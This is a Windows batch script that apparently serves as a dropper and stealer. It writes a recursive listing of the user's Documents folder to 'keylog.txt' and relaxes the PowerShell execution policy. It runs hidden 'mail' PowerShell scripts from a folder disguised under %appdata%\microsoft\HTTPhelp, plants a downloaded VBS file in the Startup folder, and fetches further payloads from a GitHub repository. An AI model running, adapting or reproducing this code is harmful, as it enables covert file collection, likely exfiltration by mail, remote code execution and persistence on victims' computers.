@echo off
cd/
cd %USERPROFILE%\OneDrive\Documents\
dir /s > keylog.txt
cls
powershell Set-ExecutionPolicy RemoteSigned
cls
powershell Get-ExecutionPolicy
cls
powershell %appdata%\microsoft\HTTPhelp\mail2.ps1
powershell %appdata%\microsoft\HTTPhelp\mail1.ps1
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
cls
WScript %appdata%\microsoft\HTTPhelp\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
cd %appdata%\microsoft\HTTPhelp\
WScript %appdata%\microsoft\HTTPhelp\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
WScript %appdata%\microsoft\HTTPhelp\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail2.ps1
WScript %appdata%\microsoft\HTTPhelp\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
WScript %appdata%\microsoft\HTTPhelp\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
WScript %appdata%\microsoft\HTTPhelp\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat
@echo off